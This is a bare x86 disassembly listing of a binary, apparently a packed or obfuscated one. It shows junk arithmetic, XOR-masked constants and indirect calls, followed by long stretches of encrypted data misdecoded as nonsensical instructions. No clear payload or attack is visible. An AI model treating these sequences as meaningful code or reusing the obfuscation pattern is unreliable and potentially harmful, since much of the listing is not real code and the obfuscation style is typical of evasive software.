  41d45e:	mov    DWORD PTR ds:0x42853d,0x177e
  41d468:	mov    DWORD PTR ds:0x4284b9,0x4211
  41d472:	mov    esi,0x2b55
  41d477:	mov    ecx,DWORD PTR ds:0x4284c9
  41d47d:	jmp    0x41d4d7
  41d482:	mov    DWORD PTR ds:0x428361,edx
  41d488:	cmp    DWORD PTR ds:0x428419,0x0
  41d48f:	jbe    0x41d4cb
  41d495:	push   0x428561
  41d49a:	push   0x428155
  41d49f:	push   0x5caf
  41d4a4:	push   DWORD PTR [ebp-0x28]
  41d4a7:	push   0x7d55
  41d4ac:	call   DWORD PTR ds:0x42e080
  41d4b2:	or     DWORD PTR ds:0x428535,ebx
  41d4b8:	xor    ecx,ecx
  41d4ba:	add    ecx,DWORD PTR ds:0x428379
  41d4c0:	mov    esi,DWORD PTR ds:0x4283d5
  41d4c6:	sub    esi,ecx
  41d4c8:	and    ecx,DWORD PTR [ecx+esi*1]
  41d4cb:	or     DWORD PTR ds:0x428561,0x760f
  41d4d5:	xor    ecx,ecx
  41d4d7:	imul   edx,eax
  41d4da:	sbb    DWORD PTR ds:0x428565,edi
  41d4e0:	mov    eax,DWORD PTR [ebp-0x90]
  41d4e6:	lea    eax,[eax+edx*1+0x14f2e240]
  41d4ed:	add    edx,ecx
  41d4ef:	mov    DWORD PTR [ebp-0x174],eax
  41d4f5:	mov    eax,DWORD PTR [ebp-0x24]
  41d4f8:	mov    ecx,DWORD PTR [ebp-0x94]
  41d4fe:	mov    edx,DWORD PTR [ebp-0x10]
  41d501:	or     DWORD PTR ds:0x42835d,ecx
  41d507:	xor    edx,ecx
  41d509:	add    edx,DWORD PTR [ebp-0x78]
  41d50c:	not    ecx
  41d50e:	mov    ecx,DWORD PTR [ebp-0xc0]
  41d514:	lea    ecx,[edx+ecx*1+0x6ac1]
  41d51b:	and    ecx,eax
  41d51d:	add    esi,esi
  41d51f:	mov    eax,0x1101
  41d524:	or     esi,DWORD PTR ds:0x42856d
  41d52a:	sub    eax,ecx
  41d52c:	adc    DWORD PTR ds:0x428365,ebx
  41d532:	add    eax,DWORD PTR [ebp+0x8]
  41d535:	cmp    DWORD PTR ds:0x428551,0x0
  41d53c:	mov    DWORD PTR ds:0x428455,0x5bb
  41d546:	mov    edx,0x635
  41d54b:	mov    DWORD PTR ds:0x428455,0x7e26
  41d555:	jmp    0x41d5d0
  41d55a:	mov    DWORD PTR ds:0x428365,0x7d12
  41d564:	cmp    DWORD PTR ds:0x428551,0x0
  41d56b:	jae    0x41d5af
  41d571:	push   DWORD PTR [ebp-0x24]
  41d574:	push   0x16b6
  41d579:	push   DWORD PTR [ebp-0x10]
  41d57c:	push   0x5f53
  41d581:	push   DWORD PTR [ebp-0x1c]
  41d584:	push   DWORD PTR [ebp-0x18]
  41d587:	push   DWORD PTR [ebp-0x28]
  41d58a:	push   0x42826f
  41d58f:	call   DWORD PTR ds:0x42e2a4
  41d595:	adc    DWORD PTR ds:0x428329,0x7656
  41d59f:	sbb    DWORD PTR ds:0x4284f1,edx
  41d5a5:	xor    DWORD PTR ds:0x428339,0x32fd
  41d5af:	mov    edx,DWORD PTR ds:0x428429
  41d5b5:	add    edx,DWORD PTR ds:0x4284cd
  41d5bb:	mov    DWORD PTR ds:0x428429,edx
  41d5c1:	sub    esi,esi
  41d5c3:	movzx  edx,BYTE PTR ds:0x428329
  41d5ca:	add    DWORD PTR ds:0x4284e5,edx
  41d5d0:	mov    DWORD PTR [ebp-0x170],eax
  41d5d6:	mov    DWORD PTR [ebp-0x15c],0xcb79b576
  41d5e0:	mov    DWORD PTR [ebp-0x158],0x9c2b8ae8
  41d5ea:	mov    DWORD PTR [ebp-0x154],0xcb79b572
  41d5f4:	mov    DWORD PTR [ebp-0x150],0x9c2b8ae8
  41d5fe:	mov    esi,DWORD PTR [ebp-0x174]
  41d604:	mov    eax,DWORD PTR [ebp-0x154]
  41d60a:	mov    edx,DWORD PTR [ebp-0x150]
  41d610:	xor    eax,0xcb79b576
  41d615:	xor    edx,0x9c2b8ae8
  41d61b:	mov    cl,0x2
  41d61d:	call   0x408bb8
  41d622:	mov    edi,eax
  41d624:	mov    ebx,edx
  41d626:	mov    eax,DWORD PTR [ebp-0x154]
  41d62c:	jmp    0x41da13
  41d631:	out    dx,al
  41d632:	sbb    DWORD PTR [edi],eax
  41d634:	mov    dh,0x2c
  41d636:	mov    esp,0xfc579970
  41d63b:	bound  ebx,QWORD PTR [esi-0x5b03d732]
  41d641:	ja     0x41d694
  41d643:	sar    BYTE PTR [esi-0x41413bb6],0xd7
  41d64a:	push   ebx
  41d64b:	lods   eax,DWORD PTR ds:[esi]
  41d64c:	xchg   ebx,eax
  41d64d:	enter  0xc6e1,0xd
  41d651:	icebp  
  41d652:	push   esp
  41d653:	and    edi,DWORD PTR [esi]
  41d655:	xlat   BYTE PTR ds:[ebx]
  41d656:	mov    dh,0x93
  41d658:	fistp  DWORD PTR [esp+eax*2]
  41d65b:	clc    
  41d65c:	jo     0x41d626
  41d65e:	adc    eax,0x3030edc9
  41d663:	(bad)  
  41d664:	jmp    DWORD PTR [ecx-0x5f5f3c8f]
  41d66a:	dec    edx
  41d66b:	cmp    DWORD PTR [edi-0x55],esp
  41d66e:	sahf   
  41d66f:	inc    ebx
  41d670:	test   BYTE PTR [ebp+esi*4+0x4bc3419a],bl
  41d677:	in     eax,dx
  41d678:	pop    sp
  41d67a:	mov    esi,ecx
  41d67c:	pop    DWORD PTR ds:0x46205cfe
  41d682:	cli    
  41d683:	pop    edi
  41d684:	pop    eax
  41d685:	sti    
  41d686:	pop    edx
  41d687:	pop    esp
  41d688:	cmc    
  41d689:	sar    DWORD PTR [ebp-0x30],1
  41d68c:	js     0x41d6bc
  41d68e:	push   ss
  41d68f:	mov    dl,0x59
  41d691:	xor    eax,0xee4890fc
  41d696:	and    esi,DWORD PTR [edi]
  41d698:	mov    edx,0xa72c607e
  41d69d:	pop    esp
  41d69e:	inc    esp
  41d69f:	ret    0xf479
  41d6a2:	fild   QWORD PTR [ebx-0x10]
  41d6a5:	(bad)  
  41d6a6:	test   BYTE PTR [ecx],0x58
  41d6a9:	dec    ebx
  41d6aa:	arpl   bx,ax
  41d6ac:	out    dx,al
  41d6ad:	(bad)  
  41d6af:	push   ss
  41d6b0:	out    dx,eax
  41d6b1:	test   BYTE PTR [edi],dh
  41d6b3:	stc    
  41d6b4:	mov    ah,0xfd
  41d6b6:	xchg   DWORD PTR [eax],ebx
  41d6b8:	les    edi,FWORD PTR [ebx]
  41d6ba:	scas   al,BYTE PTR es:[edi]
  41d6bb:	sub    BYTE PTR [eax-0x4d],al
  41d6be:	rcl    BYTE PTR [ebx+0x33],0xdb
  41d6c2:	test   BYTE PTR [ecx+edi*8],bl
  41d6c5:	int    0xb5
  41d6c7:	stc    
  41d6c8:	sar    BYTE PTR [ebx+0x2a94b258],cl
  41d6ce:	cmp    DWORD PTR [eax-0x44036ee4],0x8d36ca2b
  41d6d8:	cs pop ecx
  41d6da:	in     eax,dx
  41d6db:	mov    eax,ds:0x251bb1f
  41d6e0:	or     DWORD PTR [ebp+0x2c],esi
  41d6e3:	nop
  41d6e4:	repz pop es
  41d6e6:	inc    edi
  41d6e7:	mov    ecx,0x6edbc59f
  41d6ec:	iret   
  41d6ed:	jo     0x41d70d
  41d6ef:	loop   0x41d683
  41d6f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6f2:	or     eax,0xd39fdb46
  41d6f7:	xchg   ebx,eax
  41d6f8:	call   0xfaaf:0x673a4d4e
  41d6ff:	xchg   esp,eax
  41d700:	sbb    eax,0x79420b7e
  41d705:	and    ah,BYTE PTR es:[ecx-0x5]
  41d709:	xchg   edi,eax
  41d70a:	dec    edi
  41d70b:	rcr    BYTE PTR [esi-0x59e9a00b],cl
  41d711:	adc    BYTE PTR [eax+esi*2],al
  41d714:	jns    0x41d761
  41d716:	popf   
  41d717:	xchg   esi,eax
  41d718:	mov    dh,0x5a
  41d71a:	xchg   ebp,eax
  41d71b:	jno    0x41d775
  41d71d:	loopne 0x41d753
  41d71f:	lods   al,BYTE PTR ds:[esi]
  41d720:	cmp    al,0xc0
  41d722:	mov    dl,0x6d
  41d724:	xor    ch,BYTE PTR [ecx-0x73]
  41d727:	mov    al,ds:0xb1a54888
  41d72c:	push   esi
  41d72d:	test   cl,ah
  41d72f:	jbe    0x41d7ab
  41d731:	aaa    
  41d732:	int3   
  41d733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d734:	iret   
  41d735:	jns    0x41d6fd
  41d737:	sbb    DWORD PTR [ebx+0x11b2bc6f],ebp
  41d73d:	or     al,0x12
  41d73f:	jo     0x41d6f4
  41d741:	sub    ecx,DWORD PTR [ecx+ebp*2]
  41d744:	cmp    edi,DWORD PTR [ebx+0x7a]
  41d747:	jecxz  0x41d7a5
  41d749:	test   BYTE PTR [edi-0x2cec5fab],ah
  41d74f:	in     eax,0x33
  41d751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d752:	addr16 mov ecx,0x7e213ac9
  41d758:	scas   al,BYTE PTR es:[edi]
  41d759:	mov    esp,esi
  41d75b:	add    eax,0x35f664ed
  41d760:	dec    ebx
  41d761:	jmp    eax
  41d763:	and    eax,0x65fb0227
  41d768:	call   0x511e4a44
  41d76d:	sbb    al,0xab
  41d76f:	stos   DWORD PTR es:[edi],eax
  41d770:	gs jo  0x41d726
  41d773:	das    
  41d774:	paddsb mm5,mm4
  41d777:	push   ebx
  41d778:	add    ah,BYTE PTR [ecx]
  41d77a:	pop    ecx
  41d77b:	add    al,0x67
  41d77d:	dec    esp
  41d77e:	cmp    eax,0x985dd341
  41d783:	das    
  41d784:	fsubr  DWORD PTR [edi-0x90303a9]
  41d78a:	xchg   ebp,eax
  41d78b:	mov    al,0x7e
  41d78d:	sub    al,dh
  41d78f:	and    DWORD PTR [ebx+eax*8+0x7a],esi
  41d793:	push   esp
  41d794:	sbb    ebx,DWORD PTR [edi*8-0x9c6ed18]
  41d79b:	mov    ecx,0xa8cdc9f3
  41d7a0:	out    0x66,eax
  41d7a2:	outs   dx,BYTE PTR ds:[esi]
  41d7a3:	aam    0x73
  41d7a5:	mov    edi,0x468a275b
  41d7aa:	pop    ebp
  41d7ab:	lea    ebx,[edx+0x22]
  41d7ae:	out    0x42,al
  41d7b0:	fdiv   DWORD PTR [esi]
  41d7b2:	shr    ebp,0xe7
  41d7b5:	cmp    edx,DWORD PTR [eax-0x65]
  41d7b8:	stos   DWORD PTR es:[edi],eax
  41d7b9:	lds    ebx,FWORD PTR [ebx]
  41d7bb:	mov    bh,0x39
  41d7bd:	(bad)  
  41d7be:	fbstp  TBYTE PTR [esi+0x56]
  41d7c1:	dec    esi
  41d7c2:	idiv   DWORD PTR [edx-0x7e]
  41d7c5:	mov    al,0x73
  41d7c7:	sbb    esi,DWORD PTR [esi]
  41d7c9:	adc    WORD PTR [edx+0x38],sp
  41d7cd:	cli    
  41d7ce:	push   es
  41d7cf:	xchg   ebp,eax
  41d7d0:	in     eax,0x7f
  41d7d2:	mov    eax,0xaa6412fb
  41d7d7:	adc    ebx,esi
  41d7d9:	dec    esp
  41d7da:	or     al,0x22
  41d7dc:	out    0x8,al
  41d7de:	pop    esp
  41d7df:	fwait
  41d7e0:	mov    edx,0xa3f384ad
  41d7e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7e6:	jae    0x41d848
  41d7e8:	fwait
  41d7e9:	enter  0xc238,0x1
  41d7ed:	xor    DWORD PTR [edx+eax*1+0x61],edi
  41d7f1:	lds    ecx,FWORD PTR [esi+0x155e5127]
  41d7f7:	dec    ebp
  41d7f8:	xchg   ebx,eax
  41d7f9:	mov    ds:0x263e41a1,eax
  41d7fe:	fnstsw WORD PTR [ebp+0x3c5a77d3]
  41d804:	pop    edx
  41d805:	inc    ebx
  41d806:	mov    ah,0xa9
  41d808:	dec    edi
  41d809:	jecxz  0x41d7d4
  41d80b:	test   al,0x48
  41d80d:	je     0x41d861
  41d80f:	push   ss
  41d810:	dec    eax
  41d811:	cli    
  41d812:	addr16 add cl,cl
  41d815:	lods   al,BYTE PTR ds:[esi]
  41d816:	pop    eax
  41d817:	push   0xffffff8a
  41d819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d81a:	xchg   ebp,eax
  41d81b:	aad    0x8e
  41d81d:	cmc    
  41d81e:	mov    dh,0x23
  41d820:	adc    al,0x2e
  41d822:	or     esi,edi
  41d824:	ror    DWORD PTR [esi-0x42],0xb
  41d828:	mov    dh,0x3f
  41d82a:	in     al,dx
  41d82b:	call   0xdf2c98e8
  41d830:	add    eax,DWORD PTR [ebp+0xce6cea8]
  41d836:	cld    
  41d837:	aas    
  41d838:	inc    ebp
  41d839:	call   0xbeb:0x414fab9e
  41d840:	loopne 0x41d7eb
  41d842:	stc    
  41d843:	in     eax,0xb2
  41d845:	outs   dx,DWORD PTR ds:[esi]
  41d846:	or     eax,0x4c956e4f
  41d84b:	add    DWORD PTR [esi+0x4f],edx
  41d84e:	mov    eax,0xb5c8d045
  41d853:	push   ecx
  41d854:	and    BYTE PTR [eax+0x4c5b5955],ch
  41d85a:	adc    BYTE PTR [edi],ah
  41d85c:	cmp    eax,DWORD PTR ds:0x2b63d328
  41d862:	dec    ebx
  41d863:	retf   0x6bab
  41d866:	loope  0x41d8c4
  41d868:	das    
  41d869:	into   
  41d86a:	enter  0xef77,0x6f
  41d86e:	push   eax
  41d86f:	jmp    0xfa970d88
  41d874:	ret    0xc441
  41d877:	jnp    0x41d8ad
  41d879:	push   esi
  41d87b:	sub    BYTE PTR [edx+0x44fe964d],ah
  41d881:	mov    ds:0x4a61dd50,eax
  41d886:	push   edx
  41d887:	sub    DWORD PTR [ebp+0x3da62ae],0xd51bda2e
  41d891:	aas    
  41d892:	jmp    0x6de9:0x24a30df4
  41d899:	or     al,0x17
  41d89b:	ror    cl,cl
  41d89d:	out    0xe0,al
  41d89f:	adc    eax,DWORD PTR [ebx]
  41d8a1:	in     al,dx
  41d8a2:	xor    DWORD PTR [ebx+0x4c52a786],esi
  41d8a8:	adc    BYTE PTR [ebx],dl
  41d8aa:	in     eax,dx
  41d8ab:	xchg   edx,eax
  41d8ac:	jne    0x41d8d0
  41d8ae:	or     al,0xb
  41d8b0:	loope  0x41d8a7
  41d8b2:	dec    edx
  41d8b3:	fidiv  WORD PTR [esi]
  41d8b5:	xchg   esi,eax
  41d8b6:	inc    esi
  41d8b7:	mov    al,0x58
  41d8b9:	jne    0x41d842
  41d8bb:	mov    eax,0xa7fe8629
  41d8c0:	lahf   
  41d8c1:	or     ebp,DWORD PTR [edi]
  41d8c3:	stc    
  41d8c4:	dec    esi
  41d8c5:	jecxz  0x41d88a
  41d8c7:	push   0xfc47303
  41d8cc:	dec    ebx
  41d8cd:	cmp    ebp,edi
  41d8cf:	xchg   BYTE PTR [ecx-0x228bcb34],cl
  41d8d5:	int    0xf3
  41d8d7:	or     dl,bl
  41d8d9:	mov    bl,0x64
  41d8db:	add    edx,esi
  41d8dd:	xor    eax,0x4b98d375
  41d8e2:	mov    edx,0x1eb4994e
  41d8e7:	mov    ah,0x78
  41d8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8ea:	jae    0x41d969
  41d8ec:	mov    eax,ds:0xfc07ea0e
  41d8f1:	sub    esp,eax
  41d8f3:	add    eax,DWORD PTR [ebx+0x53]
  41d8f6:	sub    al,bl
  41d8f8:	fucom  st(5)
  41d8fa:	mov    dl,BYTE PTR [edi-0x60]
  41d8fd:	xchg   DWORD PTR [edx],ecx
  41d8ff:	call   DWORD PTR [ebp-0x2a]
  41d902:	add    eax,0x76982ae3
  41d907:	pop    edx
  41d908:	inc    esi
  41d909:	pop    esp
  41d90a:	sbb    eax,DWORD PTR [esi]
  41d90c:	mov    edi,0x61d7d751
  41d911:	xchg   edi,eax
  41d912:	pop    eax
  41d913:	push   eax
  41d914:	mov    BYTE PTR [edi+0x76],ch
  41d917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d918:	add    DWORD PTR [esi+ebx*8+0x77],ebx
  41d91c:	iret   
  41d91d:	push   cs
  41d91e:	rcl    BYTE PTR [edx],cl
  41d920:	xchg   ecx,eax
  41d921:	out    dx,al
  41d922:	push   es
  41d923:	cmp    eax,0x719bb0e
  41d928:	enter  0x1f37,0xa4
  41d92c:	aas    
  41d92d:	std    
  41d92e:	mov    ebp,DWORD PTR [edx-0x39]
  41d931:	mov    edi,0x1d634683
  41d936:	(bad)  
  41d937:	mov    ebx,0xaf47f5a1
  41d93c:	adc    BYTE PTR [edx],ah
  41d93e:	push   esi
  41d93f:	mov    ebx,0x133666d1
  41d944:	or     DWORD PTR [eax-0xf],edi
  41d947:	test   al,0x59
  41d949:	push   0xb8cc79
  41d94e:	or     cl,dh
  41d950:	leave  
  41d951:	stos   BYTE PTR es:[edi],al
  41d952:	(bad)  
  41d953:	dec    ecx
  41d954:	retf   0xae72
  41d957:	popa   
  41d958:	push   0xffffff8e
  41d95a:	fadd   QWORD PTR [ebp-0x50]
  41d95d:	inc    esi
  41d95e:	jnp    0x41d9df
  41d960:	sbb    ah,BYTE PTR [ebx-0x46]
  41d963:	fcmovu st,st(0)
  41d965:	test   DWORD PTR [edi],edi
  41d967:	sub    edi,DWORD PTR [ecx]
  41d969:	call   0x4e6f:0x77ac9993
  41d970:	jmp    0x4d8d:0x887db5bb
  41d977:	xchg   edx,eax
  41d978:	lea    esi,[ebx+0x2a]
  41d97b:	ret    0x6166
  41d97e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d97f:	jo     0x41d988
  41d981:	ss das 
  41d983:	xchg   edi,eax
  41d984:	inc    eax
  41d985:	lock or dl,BYTE PTR [eax-0x13]
  41d989:	or     BYTE PTR [ecx-0x15],0x0
  41d98d:	cld    
  41d98e:	cmp    ebp,DWORD PTR [ebx]
  41d990:	shr    DWORD PTR [esi-0x5b],0xc7
  41d994:	mov    cs,WORD PTR [edx]
  41d996:	rol    DWORD PTR [edx],cl
  41d998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d999:	sub    DWORD PTR [ebx-0x51],edi
  41d99c:	jnp    0x41d953
  41d99e:	sbb    eax,0xadafe87
  41d9a3:	fsubr  DWORD PTR [esi]
  41d9a5:	imul   ecx,ebp,0x68c22e12
  41d9ab:	jne    0x41d9ed
  41d9ad:	test   DWORD PTR [eax],ecx
  41d9af:	mov    DWORD PTR [eax+0x62],ebp
  41d9b2:	or     DWORD PTR [ebp-0x572885d5],0xcdd6ecf3
  41d9bc:	jbe    0x41da03
  41d9be:	ret    
  41d9bf:	jmp    0x41da1d
  41d9c1:	imul   ebx,DWORD PTR [ebx-0x75c1a3],0xffffffd7
  41d9c8:	xchg   edx,eax
  41d9c9:	inc    ebp
  41d9ca:	xchg   ecx,eax
  41d9cc:	call   0x3a44b697
  41d9d1:	sbb    bh,BYTE PTR [esi+0x70]
  41d9d4:	loope  0x41da15
  41d9d6:	mov    esp,0x87d54753
  41d9db:	and    al,0xd7
  41d9dd:	or     DWORD PTR [ebp+0x57],0x58
  41d9e1:	or     esi,ebx
  41d9e3:	mov    bl,0xc6
  41d9e5:	xor    al,0x93
  41d9e7:	or     al,BYTE PTR [ebx-0xc]
  41d9ea:	mov    al,ds:0x7c7fef5a
  41d9ef:	sti    
  41d9f0:	jp     0x41da49
  41d9f2:	push   es
  41d9f3:	out    0xb5,eax
  41d9f5:	mov    esp,0x290f57ad
  41d9fa:	dec    esi
  41d9fb:	imul   esp,ecx,0x6c
  41d9fe:	cmp    DWORD PTR [eax+0x57],0x464b6c05
  41da05:	or     al,0xb7
  41da07:	pop    ecx
  41da08:	pushf  
  41da09:	add    al,0x38
  41da0b:	dec    ecx
  41da0c:	dec    ecx
  41da0d:	xchg   esp,eax
  41da0e:	mov    dh,0xa2
  41da10:	sahf   
  41da11:	imul   dh
  41da13:	mov    edx,DWORD PTR [ebp-0x150]
  41da19:	xor    eax,0xcb79b576
  41da1e:	xor    edx,0x9c2b8ae8
  41da24:	mov    cl,0x3e
  41da26:	call   0x4223e0
  41da2b:	or     edi,eax
  41da2d:	or     ebx,edx
  41da2f:	mov    eax,DWORD PTR [ebp-0x15c]
  41da35:	mov    edx,DWORD PTR [ebp-0x158]
  41da3b:	jmp    0x41de22
  41da40:	outs   dx,BYTE PTR ds:[esi]
  41da41:	cdq    
  41da42:	bound  ebp,QWORD PTR fs:[esp+edi*4+0x63179970]
  41da4a:	xor    bl,ch
  41da4c:	mov    dh,0x6b
  41da4e:	jo     0x41da2d
  41da50:	add    ebx,DWORD PTR [ecx-0x40]
  41da53:	mov    esi,0xbebec44a
  41da58:	jne    0x41da98
  41da5a:	or     DWORD PTR [edx+0x4cd66e9d],0x39
  41da61:	fcomp  st(6)
  41da63:	ja     0x41d9ff
  41da65:	ror    DWORD PTR [ebp+0xf061df0],1
  41da6b:	fcmovb st,st(7)
  41da6d:	mov    bh,0xe9
  41da6f:	addr16 jle 0x41da8c
  41da72:	mov    cl,0xcd
  41da74:	arpl   WORD PTR ds:0x248120c6,dx
  41da7a:	call   0xf98:0x580e12a5
  41da81:	jo     0x41da2b
  41da83:	int3   
  41da84:	(bad)  
  41da85:	sahf   
  41da86:	xlat   BYTE PTR ds:[ebx]
  41da87:	sti    
  41da88:	sub    al,cl
  41da8a:	add    DWORD PTR [ecx+0x15486107],eax
  41da90:	out    0xeb,eax
  41da92:	pop    esi
  41da93:	sbb    esi,eax
  41da95:	jae    0x41daa4
  41da97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da98:	mov    edi,0xbcf26382
  41da9d:	mov    ds:0x5e418367,al
  41daa2:	mov    edx,0xd2f24f89
  41daa7:	jne    0x41da49
  41daa9:	and    eax,0x5fb139f9
  41daae:	pop    esi
  41daaf:	int3   
  41dab0:	mov    al,BYTE PTR [esi+0x7f]
  41dab3:	es out 0x7f,al
  41dab6:	push   edi
  41dab7:	sub    eax,DWORD PTR ds:0x97b3984e
  41dabd:	leave  
  41dabe:	lea    ecx,[edi]
  41dac0:	rcr    BYTE PTR [eax],cl
  41dac2:	int    0x16
  41dac4:	mov    ds:0x61bd4894,al
  41dac9:	mov    eax,ds:0x49bcdd6e
  41dace:	(bad)  
  41dacf:	call   0xcc73fdca
  41dad4:	scas   al,BYTE PTR es:[edi]
  41dad5:	cmp    BYTE PTR [edi-0xe],0xcf
  41dad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dada:	inc    ecx
  41dadb:	add    al,0x61
  41dadd:	bnd jg 0x41da90
  41dae0:	mov    ebx,DWORD PTR [ecx]
  41dae2:	sbb    ebp,DWORD PTR [edi]
  41dae4:	or     al,0x94
  41dae6:	add    cl,BYTE PTR [ebx]
  41dae8:	popf   
  41dae9:	add    eax,0xfbb3bfe9
  41daee:	test   BYTE PTR [eax],0xb1
  41daf1:	or     eax,0x519294f3
  41daf6:	es neg eax
  41daf9:	mov    edx,0x4dd5f23b
  41dafe:	loopne 0x41da80
  41db00:	cwde   
  41db01:	jns    0x41dad0
  41db03:	fsubr  QWORD PTR ds:0xa271ea47
  41db09:	cmc    
  41db0a:	sub    ebx,DWORD PTR [ebp-0x783f74fd]
  41db10:	pop    esi
  41db11:	jne    0x41dae2
  41db13:	xlat   BYTE PTR ss:[ebx]
  41db15:	or     edi,esi
  41db17:	in     eax,0xcb
  41db19:	loope  0x41db00
  41db1b:	or     edx,0xffffffa4
  41db1e:	push   ss
  41db1f:	mov    bh,0x54
  41db21:	(bad)  
  41db22:	jno    0x41db76
  41db24:	iret   
  41db25:	xchg   BYTE PTR [edi+0x4e],bl
  41db28:	cmp    al,0x97
  41db2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db2b:	pop    edx
  41db2c:	xor    ah,BYTE PTR [edx-0x73]
  41db2f:	std    
  41db30:	outs   dx,DWORD PTR ds:[esi]
  41db31:	add    al,ch
  41db33:	inc    ecx
  41db34:	in     al,dx
  41db35:	rcl    BYTE PTR cs:[ecx+0x7218b7fc],1
  41db3c:	enter  0x79c7,0x21
  41db40:	mov    ecx,0x68d0efc9
  41db45:	mov    eax,ds:0x539f055b
  41db4a:	vpor   xmm1,xmm3,xmm4
  41db4e:	sbb    ch,ah
  41db50:	jge    0x41daed
  41db52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db53:	(bad)  
  41db54:	ror    edi,1
  41db56:	inc    BYTE PTR [ebx+ecx*2+0x23]
  41db5a:	lahf   
  41db5b:	jle    0x41db23
  41db5d:	idiv   DWORD PTR [esi]
  41db5f:	xchg   ebp,eax
  41db60:	adc    bh,BYTE PTR [ecx+0x18]
  41db63:	es leave 
  41db65:	sahf   
  41db66:	jnp    0x41dba2
  41db68:	sub    bh,0x48
  41db6b:	and    DWORD PTR ds:[edi-0x6e8aa461],esi
  41db72:	pop    edi
  41db73:	xlat   BYTE PTR ds:[ebx]
  41db74:	out    0xc8,al
  41db76:	popf   
  41db77:	(bad)  
  41db78:	jbe    0x41db0d
  41db7a:	sbb    dh,BYTE PTR [esp+eax*4-0x1750a1b8]
  41db81:	push   edx
  41db82:	mov    ebx,0x6eee177e
  41db87:	repnz or bl,BYTE PTR [eax+ebx*8-0xaa2f244]
  41db8f:	rcl    DWORD PTR [edi],0xa9
  41db92:	stos   DWORD PTR es:[edi],eax
  41db93:	add    ch,ah
  41db95:	ds (bad) 
  41db97:	sti    
  41db98:	call   0xf5ab:0xd4692dc1
  41db9f:	leave  
  41dba0:	and    BYTE PTR [ebx+0x4e],0xbe
  41dba4:	call   0x5935:0xee78568f
  41dbab:	fiadd  WORD PTR [esi+0x51]
  41dbae:	scas   al,BYTE PTR es:[edi]
  41dbaf:	shl    DWORD PTR [esi+0x3c],0x3c
  41dbb3:	push   es
  41dbb4:	mov    DWORD PTR [edx+0x1c],ebp
  41dbb7:	(bad)  
  41dbb8:	and    dl,BYTE PTR [edi-0x21]
  41dbbb:	or     dl,BYTE PTR [edi-0x13]
  41dbbe:	(bad)  
  41dbbf:	retf   0xab0a
  41dbc2:	cli    
  41dbc3:	fcom   DWORD PTR [ecx+eiz*8+0x5609d850]
  41dbca:	add    eax,0xfdba88b
  41dbcf:	fmul   st,st(5)
  41dbd1:	sub    BYTE PTR [ebx-0x78],ch
  41dbd4:	pop    ebx
  41dbd5:	ins    DWORD PTR es:[edi],dx
  41dbd6:	dec    ebp
  41dbd7:	jecxz  0x41dbe9
  41dbd9:	jae    0x41dbe2
  41dbdb:	and    ebp,DWORD PTR [ecx]
  41dbdd:	jg     0x41dc21
  41dbdf:	fdivrp st(7),st
  41dbe1:	add    al,BYTE PTR ds:0xb34a4ce7
  41dbe7:	fs adc eax,0x6f272d59
  41dbed:	shl    BYTE PTR [ebx-0x4d2151a8],0x6a
  41dbf4:	retf   0xbd22
  41dbf7:	add    BYTE PTR [ecx],bh
  41dbf9:	cmp    DWORD PTR [edi+0x52],ecx
  41dbfc:	outs   dx,DWORD PTR ds:[esi]
  41dbfd:	imul   esp,DWORD PTR [eax+0x36],0x69
  41dc01:	jnp    0x41dba7
  41dc03:	sar    DWORD PTR [edi+eax*4+0x669a0ea0],cl
  41dc0a:	lahf   
  41dc0b:	push   edi
  41dc0c:	jg     0x41dbbe
  41dc0e:	leave  
  41dc0f:	mov    ds:0xf2970736,al
  41dc14:	jb     0x41dc3e
  41dc16:	pop    esp
  41dc17:	mov    dl,BYTE PTR [edi-0x7c53caa1]
  41dc1d:	inc    ecx
  41dc1e:	xchg   esi,eax
  41dc1f:	push   esp
  41dc20:	jge    0x41dc14
  41dc22:	or     al,0xdb
  41dc24:	xchg   esp,eax
  41dc25:	rcl    BYTE PTR [ebx],cl
  41dc27:	jl     0x41dbd0
  41dc29:	iret   
  41dc2a:	popf   
  41dc2b:	and    al,BYTE PTR [esi+0x42]
  41dc2e:	or     eax,0xc897abb9
  41dc33:	sub    bh,BYTE PTR [esp+esi*1]
  41dc36:	pop    es
  41dc37:	jae    0x41dc42
  41dc39:	xor    al,cl
  41dc3b:	hlt    
  41dc3c:	jne    0x41dbcf
  41dc3e:	loop   0x41dbf9
  41dc40:	xlat   BYTE PTR ds:[ebx]
  41dc41:	js     0x41dc11
  41dc43:	push   0x4a
  41dc45:	jb     0x41dc3c
  41dc47:	dec    ebx
  41dc48:	jo     0x41dbf6
  41dc4a:	loope  0x41dbe8
  41dc4c:	retf   
  41dc4d:	popa   
  41dc4e:	imul   ebx,DWORD PTR [ecx+0xee3bf78],0xffffffed
  41dc55:	shr    BYTE PTR [ebx],cl
  41dc57:	aaa    
  41dc58:	out    dx,eax
  41dc59:	sub    ecx,DWORD PTR [edi]
  41dc5b:	xchg   edi,eax
  41dc5c:	push   cs
  41dc5d:	call   0xc6a205f1
  41dc62:	mov    esp,0xe70fb224
  41dc67:	and    BYTE PTR [edi+0x53d07cbe],bl
  41dc6d:	sub    al,0x36
  41dc6f:	jmp    0x9380c50
  41dc74:	lods   eax,DWORD PTR ds:[esi]
  41dc75:	pop    edi
  41dc76:	(bad)  
  41dc77:	repnz push ebp
  41dc79:	addr16 test eax,0x85938a09
  41dc7f:	mov    ds:0x43d14180,eax
  41dc84:	shr    BYTE PTR [ecx+ebx*8],1
  41dc87:	into   
  41dc88:	popf   
  41dc89:	hlt    
  41dc8a:	scas   eax,DWORD PTR es:[edi]
  41dc8b:	lock std 
  41dc8d:	add    al,0x87
  41dc8f:	adc    al,0x47
  41dc91:	out    0x4c,al
  41dc93:	cmp    ebp,ebp
  41dc95:	test   BYTE PTR [eax],0x61
